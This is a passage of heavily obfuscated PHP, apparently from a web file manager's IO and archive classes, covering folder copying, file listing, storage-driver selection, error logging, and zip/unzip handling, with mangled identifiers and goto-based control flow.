$c¯¢ù—ôó‡) { IO::copy($c¯¢ù—ôó‡[$fÔ‘Í”Ş‘ [1029]], $c¯¢ù—ôó‡[$fÔ‘Í”Ş‘ [1030]], REPEAT_REPLACE); } goto aàĞ×‹†ˆ; FÇâäö¢µ: $aÙ‚Ò—‚Ûï = array(); foreach ($D¤»¦»¨¼ó as $aŠæÑÇ¿Ó => $c¯¢ù—ôó‡) { if (isset($aÚ…÷¡ÙŸ¤[$aŠæÑÇ¿Ó])) { if ($c¯¢ù—ôó‡[$fÔ‘Í”Ş‘ [76]] == 1) { continue; } if ($aÚ…÷¡ÙŸ¤[$aŠæÑÇ¿Ó][$fÔ‘Í”Ş‘ [77]] == $c¯¢ù—ôó‡[$fÔ‘Í”Ş‘ [77]]) { continue; } } if ($c¯¢ù—ôó‡[$fÔ‘Í”Ş‘ [76]] == 1) { $aÙ‚Ò—‚Ûï[] = $fÖÊ‘Í¬‰å . $fÔ‘Í”Ş‘ [8] . $aŠæÑÇ¿Ó; continue; } $c¥·…š‘Ğ· = strstr(trim($aŠæÑÇ¿Ó, $fÔ‘Í”Ş‘ [8]), $fÔ‘Í”Ş‘ [8]) ? get_path_father($aŠæÑÇ¿Ó) : $fÔ‘Í”Ş‘ [33]; $fÆäÖ÷ÔªÔ[] = array($fÔ‘Í”Ş‘ [1029] => $c¯¢ù—ôó‡[$fÔ‘Í”Ş‘ [75]], $fÔ‘Í”Ş‘ [1030] => rtrim($fÖÊ‘Í¬‰å, $fÔ‘Í”Ş‘ [8]) . $fÔ‘Í”Ş‘ [8] . $c¥·…š‘Ğ·, $fÔ‘Í”Ş‘ [1031] => $c¯¢ù—ôó‡); } $CÃ‡¨Ö¾Û = array($fÔ‘Í”Ş‘ [173] => $fÆäÖ÷ÔªÔ, $fÔ‘Í”Ş‘ [76] => $aÙ‚Ò—‚Ûï); goto b²İÕöÑç; B­ç›å¬·Æ: $fÔ‘Í”Ş‘  =& $_SERVER[Â€Á›¨õ]; if (!IO::exist($fÔŠ‹Ë¨°‚)) { return !1; } if (!IO::exist($fÖÊ‘Í¬‰å)) { IO::mkdir($fÖÊ‘Í¬‰å); } goto CèĞÚ÷ó²; CèĞÚ÷ó²: $D¤»¦»¨¼ó = self::_listAll($fÔŠ‹Ë¨°‚); $aÚ…÷¡ÙŸ¤ = self::_listAll($fÖÊ‘Í¬‰å); $fÆäÖ÷ÔªÔ = array(); goto FÇâäö¢µ; aàĞ×‹†ˆ: } private static function _listAll($Aõ¬°àï¢Œ) { $a¢Ê°¾¾—Œ =& $_SERVER[Â€Á›¨õ]; $Aõ¬°àï¢Œ = KodIO::clear($Aõ¬°àï¢Œ); $FÆŸ»ßĞµ = IO::listAll($Aõ¬°àï¢Œ); foreach ($FÆŸ»ßĞµ as &$f¤¨ÙØŸ«Ü) { $döœ‰·Á‘Ÿ = substr($f¤¨ÙØŸ«Ü[$a¢Ê°¾¾—Œ[75]], strlen($Aõ¬°àï¢Œ)); $f¤¨ÙØŸ«Ü[$a¢Ê°¾¾—Œ[1033]] = trim($döœ‰·Á‘Ÿ, $a¢Ê°¾¾—Œ[8]); } unset($f¤¨ÙØŸ«Ü); return array_to_keyvalue($FÆŸ»ßĞµ, $a¢Ê°¾¾—Œ[1033]); } public static function fileSubstr($FºˆÄÇ•‡, $b•¡ÆÖ®Æ¤, $aÅ¶Ãå±š° = false) { goto E¾÷àÍöŞÏ; d×õ°ö¤âÖ: if ($aÅ¶Ãå±š° <= 0) { return $BÃÓƒŒ¼Œ‘[33]; } if ($b•¡ÆÖ®Æ¤ < 0 || $b•¡ÆÖ®Æ¤ >= $BâÀÈŠÒ¤Å || $aÅ¶Ãå±š° > 1024 * 1024 * 5) { throw new Exception("\146\151\154\x65\122\145\x61\x64\x20\145\x72\162\157\x72\x21\x20\x73\x74\x61\x72\x74\x3d{$b•¡ÆÖ®Æ¤}\73\x6c\x65\x6e\x67\x74\150\x3d{$aÅ¶Ãå±š°}\x3b\40\x73\x69\172\x65\75{$BâÀÈŠÒ¤Å}\x3b"); } $dˆ¤öíóù = $F°ƒº‡Ë«Ú->fileSubstr($FºˆÄÇ•‡, $b•¡ÆÖ®Æ¤, $aÅ¶Ãå±š°); goto c’ó¤Û‡‘; CïÍŞ‚Á°ù: $c¢‡êé°§° = $b•¡ÆÖ®Æ¤; $A××ÔŸêÔŸ = $aÅ¶Ãå±š°; if ($b•¡ÆÖ®Æ¤ < 0) { $b•¡ÆÖ®Æ¤ = $BâÀÈŠÒ¤Å + $b•¡ÆÖ®Æ¤; } goto FÎ÷¡µˆ—ˆ; E¾÷àÍöŞÏ: $BÃÓƒŒ¼Œ‘ =& $_SERVER[Â€Á›¨õ]; $F°ƒº‡Ë«Ú = self::driverMake($FºˆÄÇ•‡); $BâÀÈŠÒ¤Å = $F°ƒº‡Ë«Ú->size($FºˆÄÇ•‡); goto CïÍŞ‚Á°ù; c’ó¤Û‡‘: if (!$dˆ¤öíóù && $aÅ¶Ãå±š° && isset($GLOBALS[$BÃÓƒŒ¼Œ‘[1036]])) { throw new Exception($GLOBALS[$BÃÓƒŒ¼Œ‘[1036]][$BÃÓƒŒ¼Œ‘[1037]]); } return $dˆ¤öíóù; goto AÆÜ‘³Ïµ; FÎ÷¡µˆ—ˆ: if ($aÅ¶Ãå±š° === !1) { $aÅ¶Ãå±š° = $BâÀÈŠÒ¤Å - $b•¡ÆÖ®Æ¤; } if ($b•¡ÆÖ®Æ¤ + $aÅ¶Ãå±š° > $BâÀÈŠÒ¤Å) { $aÅ¶Ãå±š° = $BâÀÈŠÒ¤Å - $b•¡ÆÖ®Æ¤; } if (!$BâÀÈŠÒ¤Å && $F°ƒº‡Ë«Ú->getType() == $BÃÓƒŒ¼Œ‘[105] && !$F°ƒº‡Ë«Ú->exist($FºˆÄÇ•‡)) { throw new Exception($BÃÓƒŒ¼Œ‘[1034] . LNG($BÃÓƒŒ¼Œ‘[1035]) . $BÃÓƒŒ¼Œ‘[899] . get_path_this($FºˆÄÇ•‡) . $BÃÓƒŒ¼Œ‘[33]); } goto d×õ°ö¤âÖ; AÆÜ‘³Ïµ: } private static function driverMake(&$C×ƒÓóÔä) { goto f Ş˜‹ÊÏ; f Ş˜‹ÊÏ: $FÛ‘§Ò²¯š =& $_SERVER[Â€Á›¨õ]; $d‚‚ŠÅÎé = KodIO::parse($C×ƒÓóÔä); if (!self::$driverListSystem) { $f¥æé‡ãëï = Model($FÛ‘§Ò²¯š[716])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($f¥æé‡ãëï, $FÛ‘§Ò²¯š[388]); } goto A‡‚­‰‹³; dÊ—ËŞä¿‚: return $b«îñŒ¯; goto fÀÏ”Ğ©¬·; A‡‚­‰‹³: if ($d‚‚ŠÅÎé[$FÛ‘§Ò²¯š[29]] == KodIO::KOD_IO && !self::$driverListSystem[$d‚‚ŠÅÎé[$FÛ‘§Ò²¯š[388]]]) { return !1; } $C×ƒÓóÔä = $d‚‚ŠÅÎé[$FÛ‘§Ò²¯š[1038]]; $b«îñŒ¯ = self::driverGet($d‚‚ŠÅÎé, $C×ƒÓóÔä); goto dÊ—ËŞä¿‚; fÀÏ”Ğ©¬·: } private static function driverGet($CÁÎ­˜İ‚, &$F«¸æ¢Ÿ‹) { goto a÷ëÇ¢çÅñ; EÚÚ‹Ëòê: $DñßËØİ‹ = self::$driverCache[$e¦°¥†í‘º]; $DñßËØİ‹->pathDriver = $bŠàÅŞÉ°¿; $DñßËØİ‹->pathBase = $b°â×‡î»É[33]; goto d¥£ĞÈ³±¢; EíƒÏ¼ª«¾: $DñßËØİ‹->path = $F«¸æ¢Ÿ‹; return $DñßËØİ‹; goto EŞ§Ö˜æñ…; d¥£ĞÈ³±¢: if (isset($e›…À‘ÚÔ×[$b°â×‡î»É[6]][$b°â×‡î»É[1050]])) { $DñßËØİ‹->pathBase = rtrim($e›…À‘ÚÔ×[$b°â×‡î»É[6]][$b°â×‡î»É[1050]], $b°â×‡î»É[8]) . $b°â×‡î»É[8]; $F«¸æ¢Ÿ‹ = $DñßËØİ‹->pathBase . ltrim($F«¸æ¢Ÿ‹, $b°â×‡î»É[8]); } $F«¸æ¢Ÿ‹ = $DñßËØİ‹->getPath($F«¸æ¢Ÿ‹); if (isset($CÁÎ­˜İ‚[$b°â×‡î»É[1022]])) { $F«¸æ¢Ÿ‹ = $CÁÎ­˜İ‚[$b°â×‡î»É[1022]]; } goto EíƒÏ¼ª«¾; c–ïôß•ŠŸ: switch ($CÁÎ­˜İ‚[$b°â×‡î»É[29]]) { case KodIO::KOD_IO: $e›…À‘ÚÔ× = self::$driverListSystem[$aÉÇ¢Ê„åİ]; break; case KodIO::KOD_SOURCE: $F«¸æ¢Ÿ‹ = $aÉÇ¢Ê„åİ . $F«¸æ¢Ÿ‹; $e›…À‘ÚÔ× = array($b°â×‡î»É[1040] => $b°â×‡î»É[1041], $b°â×‡î»É[6] => $CÁÎ­˜İ‚); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $B‹á…¥©øˆ = $GLOBALS[$b°â×‡î»É[1042]]; self::$driverListUser = array_to_keyvalue($B‹á…¥©øˆ, $b°â×‡î»É[388]); } $e›…À‘ÚÔ× = self::$driverListUser[$aÉÇ¢Ê„åİ]; break; case KodIO::KOD_SHARE_LINK: $e›…À‘ÚÔ× = array($b°â×‡î»É[1040] => $b°â×‡î»É[1043], $b°â×‡î»É[6] => $CÁÎ­˜İ‚); $bš´ñë«Üß = Action($b°â×‡î»É[1044])->sharePathInfo($CÁÎ­˜İ‚[$b°â×‡î»É[75]]); $F«¸æ¢Ÿ‹ = $bš´ñë«Üß[$b°â×‡î»É[390]]; if (!$bš´ñë«Üß[$b°â×‡î»É[390]]) { $BåÌÕíçËâ = Model($b°â×‡î»É[558])->getInfo($bš´ñë«Üß[$b°â×‡î»É[462]]); $F«¸æ¢Ÿ‹ = KodIO::clear($BåÌÕíçËâ[$b°â×‡î»É[1045]] . $CÁÎ­˜İ‚[$b°â×‡î»É[1038]]); $CÁÎ­˜İ‚[$b°â×‡î»É[460]] = $BåÌÕíçËâ; $CÁÎ­˜İ‚[$b°â×‡î»É[1022]] = $F«¸æ¢Ÿ‹; $e›…À‘ÚÔ× = array($b°â×‡î»É[1040] => $b°â×‡î»É[1046], $b°â×‡î»É[6] => $CÁÎ­˜İ‚); } break; case KodIO::KOD_SHARE_ITEM: $e›…À‘ÚÔ× = array($b°â×‡î»É[1040] => $b°â×‡î»É[1047], $b°â×‡î»É[6] => $CÁÎ­˜İ‚); $BåÌÕíçËâ = Model($b°â×‡î»É[558])->getInfo($CÁÎ­˜İ‚[$b°â×‡î»É[388]]); if ($BåÌÕíçËâ[$b°â×‡î»É[390]] == $b°â×‡î»É[491]) { $F«¸æ¢Ÿ‹ = KodIO::clear($BåÌÕíçËâ[$b°â×‡î»É[1045]] . $CÁÎ­˜İ‚[$b°â×‡î»É[1038]]); $CÁÎ­˜İ‚[$b°â×‡î»É[460]] = $BåÌÕíçËâ; $CÁÎ­˜İ‚[$b°â×‡î»É[1022]] = $F«¸æ¢Ÿ‹; $e›…À‘ÚÔ× = array($b°â×‡î»É[1040] => $b°â×‡î»É[1048], $b°â×‡î»É[6] => $CÁÎ­˜İ‚); } else { if (!$F«¸æ¢Ÿ‹) { $F«¸æ¢Ÿ‹ = $BåÌÕíçËâ[$b°â×‡î»É[390]]; } } break; default: $F«¸æ¢Ÿ‹ = $CÁÎ­˜İ‚[$b°â×‡î»É[75]]; $e›…À‘ÚÔ× = array($b°â×‡î»É[1040] => $b°â×‡î»É[1049]); break; } $e¦°¥†í‘º = $CÁÎ­˜İ‚[$b°â×‡î»É[75]]; if (!isset(self::$driverCache[$e¦°¥†í‘º])) { $dÔ¡òá£– = strtolower($e›…À‘ÚÔ×[$b°â×‡î»É[93]]); $D¡¨ÒÊ˜¸Í = $GLOBALS[$b°â×‡î»É[6]][$b°â×‡î»É[87]][$b°â×‡î»É[768]]; $FâÒ‰Œ‰® = $b°â×‡î»É[71] . (isset($D¡¨ÒÊ˜¸Í[$dÔ¡òá£–]) ? $D¡¨ÒÊ˜¸Í[$dÔ¡òá£–] : ucfirst($dÔ¡òá£–)); if (!class_exists($FâÒ‰Œ‰®)) { show_json("{$FâÒ‰Œ‰®}\40\156\157\x74\40\x65\x78\151\163\x74\163\41", !1); } $D”‡Å£ÊàÈ = isset($e›…À‘ÚÔ×[$b°â×‡î»É[6]]) ? $e›…À‘ÚÔ×[$b°â×‡î»É[6]] : !1; self::$driverCache[$e¦°¥†í‘º] = new $FâÒ‰Œ‰®($D”‡Å£ÊàÈ); } goto EÚÚ‹Ëòê; a÷ëÇ¢çÅñ: $b°â×‡î»É =& $_SERVER[Â€Á›¨õ]; $bŠàÅŞÉ°¿ = $CÁÎ­˜İ‚[$b°â×‡î»É[1039]]; $aÉÇ¢Ê„åİ = $CÁÎ­˜İ‚[$b°â×‡î»É[388]]; goto c–ïôß•ŠŸ; EŞ§Ö˜æñ…: } public static function errorTips($eìâŠùáº = false) { goto FÖ˜ßÊõÁº; FÖ˜ßÊõÁº: $AŠ¦à´ß‡¹ =& $_SERVER[Â€Á›¨õ]; static $b´À÷×… = array(); $c…³“Ûèò® = 1000; goto cö¯ßËßö; cö¯ßËßö: if ($eìâŠùáº === -1) { return $b´À÷×… ? $b´À÷×…[count($b´À÷×…) - 1] : $AŠ¦à´ß‡¹[33]; } if ($eìâŠùáº === !1) { return implode($AŠ¦à´ß‡¹[227], $b´À÷×…); } if (count($b´À÷×…) >= $c…³“Ûèò®) { $b´À÷×… = array_slice($b´À÷×…, $c…³“Ûèò® * 0.5, $c…³“Ûèò®); } goto Aèå¢¥ğšù; Aèå¢¥ğšù: $b´À÷×…[] = $eìâŠùáº; write_log($AŠ¦à´ß‡¹[159] . ACTION . $AŠ¦à´ß‡¹[1051] . $eìâŠùáº, $AŠ¦à´ß‡¹[1052]); goto dî‘‹ãÕ˜; dî‘‹ãÕ˜: } public static function getLastError($eÎ´Ğ™ä™İ = '') { $D¤òİÜÌÒ = self::errorTips(-1); return $D¤òİÜÌÒ ? $D¤òİÜÌÒ : $eÎ´Ğ™ä™İ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aªÄ“Ëö×¯; if (!$aªÄ“Ëö×¯) { $eãğ±Ä¨Ì“ = IO::init($_SERVER[Â€Á›¨õ][8]); } return $eãğ±Ä¨Ì“; } private static function iconvSystem($EˆÇÆ°µê‚) { return self::local()->iconvSystem($EˆÇÆ°µê‚); } private static function iconvApp($d‚à¶„ÏÛ) { return self::local()->iconvApp($d‚à¶„ÏÛ); } public static function zip($F†™Íİ’Õ…, $BÜÊ”†è„§ = "\172\x69\160", $A»¦Ê‹ö = '', $b‹øƒÑ = REPEAT_RENAME) { goto f«±˜¸¢šŞ; A«ÍñÁ½Ğ–: if ($A»¦Ê‹ö || !$AÑñ±¿¤ùô) { if ($AÑñ±¿¤ùô && strstr($AÑñ±¿¤ùô, TEMP_FILES)) { $dÆÎ¯œÉ¡ = $dÄ”ùó„Â = array(); recursion_dir($d¹ïË˜‚’, $dÆÎ¯œÉ¡, $dÄ”ùó„Â, 0); foreach ($dÆÎ¯œÉ¡ as $dº¯¶ˆ¢) { del_dir($dº¯¶ˆ¢); } foreach ($dÄ”ùó„Â as $dÌÒŒ‘£ê”) { if ($dÌÒŒ‘£ê” == $E˜í¢Ä†Õù) { continue; } del_file($dÌÒŒ‘£ê”); } } return $c„¬Üù¥‘Ô; } $bæ‚´¹¥…† = self::pathFather($eªÑ‘ëà—Ü[$Bİê¿¬ÔÎ[75]]); $e‹„ÜãĞã° = self::move($c„¬Üù¥‘Ô, $bæ‚´¹¥…†, $b‹øƒÑ); goto CŒÚµÎ´²Ø; Fä¬‡ÄŸ«å: foreach ($dÄ”ùó„Â as $F¶Ü‚£÷Âë => $eç­å¯åô) { $dÄ”ùó„Â[$F¶Ü‚£÷Âë] = self::iconvSystem($eç­å¯åô); } KodArchive::create($E˜í¢Ä†Õù, $dÄ”ùó„Â); if (!IO::exist($c„¬Üù¥‘Ô)) { if ($AÑñ±¿¤ùô) { del_dir($AÑñ±¿¤ùô); } show_json(LNG($Bİê¿¬ÔÎ[1055]), !1); } goto A«ÍñÁ½Ğ–; f®İŒ²¨Ğ—: $c„¬Üù¥‘Ô = $d¹ïË˜‚’ . $A––µ„šãï . $Bİê¿¬ÔÎ[94] . $BÜÊ”†è„§; $c„¬Üù¥‘Ô = get_filename_auto($c„¬Üù¥‘Ô, $Bİê¿¬ÔÎ[33], $b‹øƒÑ); $E˜í¢Ä†Õù = self::iconvSystem($c„¬Üù¥‘Ô); goto Fä¬‡ÄŸ«å; CŒÚµÎ´²Ø: if (!$e‹„ÜãĞã°) { del_dir($AÑñ±¿¤ùô); show_json(LNG($Bİê¿¬ÔÎ[1055]), !1); } del_dir($AÑñ±¿¤ùô); return $e‹„ÜãĞã°; goto AÙ™‰¿ğŠº; f«±˜¸¢šŞ: $Bİê¿¬ÔÎ =& $_SERVER[Â€Á›¨õ]; $FŒ¹‰Ã—¸Ô = self::init($F†™Íİ’Õ…[0][$Bİê¿¬ÔÎ[75]]); $eªÑ‘ëà—Ü = self::info($F†™Íİ’Õ…[0][$Bİê¿¬ÔÎ[75]]); goto BõŸÃ„Ÿ½õ; f¥ÔÙÚˆ™ß: if (count($dÄ”ùó„Â) > 1) { $dâ²´·ğ®… = IO::info(IO::pathFather($eªÑ‘ëà—Ü[$Bİê¿¬ÔÎ[75]])); $A––µ„šãï = $dâ²´·ğ®…[$Bİê¿¬ÔÎ[28]]; } $d¹ïË˜‚’ = $AÑñ±¿¤ùô; if (!$d¹ïË˜‚’) { $d¹ïË˜‚’ = get_path_father($eªÑ‘ëà—Ü[$Bİê¿¬ÔÎ[75]]); if (!$A»¦Ê‹ö && $FŒ¹‰Ã—¸Ô->getType() == $Bİê¿¬ÔÎ[105]) { $d¹ïË˜‚’ = get_path_father($FŒ¹‰Ã—¸Ô->path); } $E£‰›®•Ú• = IO::info($d¹ïË˜‚’); if (!$E£‰›®•Ú•[$Bİê¿¬ÔÎ[194]]) { show_json(LNG($Bİê¿¬ÔÎ[1054]), !1); } } goto f®İŒ²¨Ğ—; BõŸÃ„Ÿ½õ: $AÑñ±¿¤ùô = !1; if (!$A»¦Ê‹ö && $FŒ¹‰Ã—¸Ô->getType() == $Bİê¿¬ÔÎ[105]) { $dÄ”ùó„Â = self::zipFileList($F†™Íİ’Õ…); } else { $AÑñ±¿¤ùô = $A»¦Ê‹ö ? $A»¦Ê‹ö : TEMP_FILES . $Bİê¿¬ÔÎ[1053] . time() . rand_string(8) . $Bİê¿¬ÔÎ[8]; mk_dir($AÑñ±¿¤ùô); $dÄ”ùó„Â = self::zipFileList($F†™Íİ’Õ…, $AÑñ±¿¤ùô); } $A––µ„šãï = $eªÑ‘ëà—Ü[$Bİê¿¬ÔÎ[28]]; goto f¥ÔÙÚˆ™ß; AÙ™‰¿ğŠº: } public static function unzip($E“É„˜Š, $BŠ‰Ì¶ÇØ = "\x72\x65\160\154\141\x63\145") { goto aïä»ô°¯ì; c…À“ĞäÒÂ: foreach ($f‰çœôó” as $EÚ·Ö¦Ì) { $EÚ·Ö¦Ì = self::iconvApp($EÚ·Ö¦Ì); self::move($EÚ·Ö¦Ì, $bĞèÖ‚Õ, $BŠ‰Ì¶ÇØ); } del_dir($F«ç½ÙÛ“È); if (!$AÄöœ…ç ) { del_file($d¿•¤±‰ê°); } goto C¨Ş˜¯êÙ; C¨Ş˜¯êÙ: return !0; goto aà¨ÊšÃË‡; E‡îÍ¢›³ù: if (!($f‰Ç‹â¡Ì = parent::info($aÃöÊ¼¾ßÍ))) { show_json(LNG($e‘‚Ô÷Á¹°[1057]), !1); } if (!($BÛÃß¹ÄÖ = parent::infoFull($bĞèÖ‚Õ))) { $bĞèÖ‚Õ = parent::mkdir($bĞèÖ‚Õ); $BÛÃß¹ÄÖ = array($e‘‚Ô÷Á¹°[75] => $bĞèÖ‚Õ); } else { if (isset($BÛÃß¹ÄÖ[$e‘‚Ô÷Á¹°[390]]) && trim($BÛÃß¹ÄÖ[$e‘‚Ô÷Á¹°[75]], $e‘‚Ô÷Á¹°[8]) != trim($bĞèÖ‚Õ, $e‘‚Ô÷Á¹°[8])) { $FíÁâÚìÚî = KodIO::make($BÛÃß¹ÄÖ[$e‘‚Ô÷Á¹°[472]]); $eÌº²÷’›— = parent::fileNameAuto($FíÁâÚìÚî, $BÛÃß¹ÄÖ[$e‘‚Ô÷Á¹°[28]], REPEAT_RENAME_FOLDER, !0); $bĞèÖ‚Õ = parent::mkdir($FíÁâÚìÚî . $eÌº²÷’›—); $BÛÃß¹ÄÖ = array($e‘‚Ô÷Á¹°[75] => $bĞèÖ‚Õ); } } $bĞèÖ‚Õ = $BÛÃß¹ÄÖ[$e‘‚Ô÷Á¹°[75]]; goto CÂĞŠ¸£‡¾; C¿Í¸Òä¨Í: Hook::trigger($e‘‚Ô÷Á¹°[1063], $F«ç½ÙÛ“È); recursion_dir($F«ç½ÙÛ“È, $d¿ÜÈ¼µôÇ, $eßĞãÎô„, 0); $f‰çœôó” = array_merge($d¿ÜÈ¼µôÇ, $eßĞãÎô„); goto c…À“ĞäÒÂ; C™¹‹„¬„: $FŒŸ‰šß• = KodArchive::extract($d¿•¤±‰ê°, $F«ç½ÙÛ“È . $e‘‚Ô÷Á¹°[8], $BºµóŞÈÀ±); self::archiveExt(); if (!$FŒŸ‰šß•[$e‘‚Ô÷Á¹°[1060]]) { show_json($e‘‚Ô÷Á¹°[1061] . $FŒŸ‰šß•[$e‘‚Ô÷Á¹°[1062]], !1); } goto C¿Í¸Òä¨Í; aïä»ô°¯ì: $e‘‚Ô÷Á¹° =& $_SERVER[Â€Á›¨õ]; $aÃöÊ¼¾ßÍ = $E“É„˜Š[$e‘‚Ô÷Á¹°[75]]; $bĞèÖ‚Õ = $E“É„˜Š[$e‘‚Ô÷Á¹°[1056]]; goto E‡îÍ¢›³ù; eÒ±Ò’»‹÷: mk_dir($F«ç½ÙÛ“È); $Eİ’Ù¸ÜÙ = self::fileExt($f‰Ç‹â¡Ì); $d¿•¤±‰ê° = $F«ç½ÙÛ“È . $e‘‚Ô÷Á¹°[94] . $Eİ’Ù¸ÜÙ; goto eİö½§š¼‡; eİö½§š¼‡: if (!@file_exists(self::iconvSystem($d¿•¤±‰ê°))) { $AÄöœ…ç  = self::localFilePath($aÃöÊ¼¾ßÍ, $Eİ’Ù¸ÜÙ); $d¿•¤±‰ê° = $AÄöœ…ç  ? $AÄöœ…ç  : parent::download($aÃöÊ¼¾ßÍ, $d¿•¤±‰ê°); } $d¿•¤±‰ê° = self::iconvSystem($d¿•¤±‰ê°); $BºµóŞÈÀ± = isset($E“É„˜Š[$e‘‚Ô÷Á¹°[1058]]) ? $E“É„˜Š[$e‘‚Ô÷Á¹°[1058]] : $e‘‚Ô÷Á¹°[1059]; goto C™¹‹„¬„; CÂĞŠ¸£‡¾: $DÄ’±ó½Ş = self::tmpFileName($f‰Ç‹â¡Ì); $F«ç½ÙÛ“È = TEMP_FILES . $DÄ’±ó½Ş; del_dir($F«ç½ÙÛ“È); goto eÒ±Ò’»‹÷; aà¨ÊšÃË‡: } public static function unzipList($eá©ÔÕÇàÖ) { goto Dº§ÀéÂçˆ; CÌİºä¡É‹: if (!is_dir($bªâ»¥­•ƒ)) { mk_dir($bªâ»¥­•ƒ); } $Bìâ¦ÓÙÜ¡ = $bªâ»¥­•ƒ . $Bõ¾«Š­ì¥[8] . $a¨Ç‡²±‘°; if (!@file_exists(self::iconvSystem($Bìâ¦ÓÙÜ¡))) { if (isset($Eá»²ª‘•¤)) { url_request($FŠƒ¥šéŸĞ, $Bõ¾«Š­ì¥[1067], $Bìâ¦ÓÙÜ¡); } else { $EìÃÕòÕ´å = self::localFilePath($FŠƒ¥šéŸĞ, $bª¨ĞêŞ§–); $Bìâ¦ÓÙÜ¡ = $EìÃÕòÕ´å ? $EìÃÕòÕ´å : self::download($FŠƒ¥šéŸĞ, $Bìâ¦ÓÙÜ¡); } } goto aİà„»–¼; Dº§ÀéÂçˆ: $Bõ¾«Š­ì¥ =& $_SERVER[Â€Á›¨õ]; $FŠƒ¥šéŸĞ = $eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[75]]; $aŞ½‰îÇßÄ = isset($eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[1064]]) ? $eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[1064]] : -1; goto dŸ§¶Ì’Şß; D„©¼¨¹—: if (isset($Eá»²ª‘•¤)) { $c–×õ‹§»Œ = array($Eá»²ª‘•¤[$Bõ¾«Š­ì¥[75]], $Eá»²ª‘•¤[$Bõ¾«Š­ì¥[1064]], $Eá»²ª‘•¤[$Bõ¾«Š­ì¥[28]]); $a¨Ç‡²±‘° = md5(implode($Bõ¾«Š­ì¥[70], $c–×õ‹§»Œ)) . $Bõ¾«Š­ì¥[94] . get_path_ext($Eá»²ª‘•¤[$Bõ¾«Š­ì¥[28]]); } else { $c–×õ‹§»Œ = array($FÖ„½ê†œ”[$Bõ¾«Š­ì¥[28]], $FÖ„½ê†œ”[$Bõ¾«Š­ì¥[75]], $FÖ„½ê†œ”[$Bõ¾«Š­ì¥[77]]); $a¨Ç‡²±‘° = md5(implode($Bõ¾«Š­ì¥[70], $c–×õ‹§»Œ)) . $Bõ¾«Š­ì¥[94] . $bª¨ĞêŞ§–; } if ($aŞ½‰îÇßÄ == -1) { $Cï‰ÛÆæÂ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\126\x69\145\167\57{$C´Ú„Äµå”}\57{$a¨Ç‡²±‘°}\x2e\154\x6f\147"; $E÷Å¡êîœ = self::infoFull($Cï‰ÛÆæÂ); if ($E÷Å¡êîœ) { $Cï‰ÛÆæÂ = $E÷Å¡êîœ[$Bõ¾«Š­ì¥[75]]; $f®º‰ôÏŒñ = self::getContent($Cï‰ÛÆæÂ); if ($f®º‰ôÏŒñ) { $d‹åƒÇº¼ = json_decode($f®º‰ôÏŒñ, !0); if (count($d‹åƒÇº¼) >= $bÏÄìß²¹Ş) { show_json(sprintf(LNG($Bõ¾«Š­ì¥[1066]), count($d‹åƒÇº¼)), !1); } return $d‹åƒÇº¼; } } else { $Cï‰ÛÆæÂ = self::mkfile($Cï‰ÛÆæÂ); } } $bªâ»¥­•ƒ = TEMP_FILES . $C´Ú„Äµå”; goto CÌİºä¡É‹; aÚÕõàîù: return $cÚÍ¤ìÛÅ™[$Bõ¾«Š­ì¥[1062]]; goto f‡ÙÛ­‡ËÓ; eï®«Ñ²Úˆ: $FÖ„½ê†œ” = self::info($cì†…Â‰Œ); $bª¨ĞêŞ§– = self::fileExt($FÖ„½ê†œ”); $C´Ú„Äµå” = self::tmpFileName($FÖ„½ê†œ”); goto D„©¼¨¹—; aÈÍèµ‚ª: $d‹åƒÇº¼ = json_encode($cÚÍ¤ìÛÅ™[$Bõ¾«Š­ì¥[1062]]); self::setContent($Cï‰ÛÆæÂ, $d‹åƒÇº¼); if (count($cÚÍ¤ìÛÅ™[$Bõ¾«Š­ì¥[1062]]) >= $bÏÄìß²¹Ş) { show_json(sprintf(LNG($Bõ¾«Š­ì¥[1066]), count($cÚÍ¤ìÛÅ™[$Bõ¾«Š­ì¥[1062]])), !1); } goto aÚÕõàîù; dŸ§¶Ì’Şß: $bÏÄìß²¹Ş = 50000; if (request_url_safe($FŠƒ¥šéŸĞ)) { $Eá»²ª‘•¤ = parse_url_query($FŠƒ¥šéŸĞ); if (!isset($Eá»²ª‘•¤[$Bõ¾«Š­ì¥[75]])) { show_json($Bõ¾«Š­ì¥[1065], !1); } } $cì†…Â‰Œ = isset($Eá»²ª‘•¤) ? $Eá»²ª‘•¤[$Bõ¾«Š­ì¥[75]] : $FŠƒ¥šéŸĞ; goto eï®«Ñ²Úˆ; dŞ¼”÷§ïä: self::archiveExt(); del_dir($bªâ»¥­•ƒ); if (!$cÚÍ¤ìÛÅ™[$Bõ¾«Š­ì¥[1060]]) { show_json($cÚÍ¤ìÛÅ™[$Bõ¾«Š­ì¥[1062]], !1); } goto aÈÍèµ‚ª; aİà„»–¼: $Bìâ¦ÓÙÜ¡ = self::iconvSystem($Bìâ¦ÓÙÜ¡); if ($aŞ½‰îÇßÄ >= 0) { $dØª“§†Éß = isset($eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[1068]]) ? $eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[1068]] : !1; $F¸ÍªÖÖìÀ = isset($eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[28]]) ? $eá©ÔÕÇàÖ[$Bõ¾«Š­ì¥[28]] : $Bõ¾«Š­ì¥[33]; KodArchive::filePreview($Bìâ¦ÓÙÜ¡, $aŞ½‰îÇßÄ, $dØª“§†Éß, $F¸ÍªÖÖìÀ); self::archiveExt(); die; } $cÚÍ¤ìÛÅ™ = KodArchive::listContent($Bìâ¦ÓÙÜ¡); goto dŞ¼”÷§ïä; f‡ÙÛ­‡ËÓ: } private static function fileExt($DœÚ­·§ğ) { $DøÅğ¦‰ÖÎ =& $_SERVER[Â€Á›¨õ]; $c´‚…÷ï›Ó = $DœÚ­·§ğ[$DøÅğ¦‰ÖÎ[167]]; if ($c´‚…÷ï›Ó == $DøÅğ¦‰ÖÎ[1069]) { $e‡ÛóáÄ‡ = $DøÅğ¦‰ÖÎ[1070]; if (substr($DœÚ­·§ğ[$DøÅğ¦‰ÖÎ[28]], -strlen($e‡ÛóáÄ‡)) == $e‡ÛóáÄ‡) { $c´‚…÷ï›Ó = $DøÅğ¦‰ÖÎ[1071]; } } 